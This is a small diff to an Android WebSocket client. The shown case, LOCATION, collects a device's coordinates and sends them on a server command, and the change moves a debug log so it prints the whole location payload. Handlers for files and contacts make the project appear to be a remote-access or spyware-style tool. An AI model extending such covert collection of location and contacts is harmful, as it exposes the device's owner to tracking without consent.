@@ -102,13 +102,13 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     sendResponse("files", files.toString());
                     break;
                 case LOCATION:
-                    Log.e("eeee", LocationV2.getLatitude(context).toString());
                     json.put("latitude", LocationV2.getLatitude(context));
                     json.put("longitude", LocationV2.getLongitude(context));
                     json.put("altitude", LocationV2.getAltitude(context));
                     long timestamp = System.currentTimeMillis();
                     json.put("timestamp", timestamp);
                     json.put("res", "location");
+                    Log.e("eeee", json.toString());
                     send(json.toString());
                     break;
                 case READ_CONTACTS:
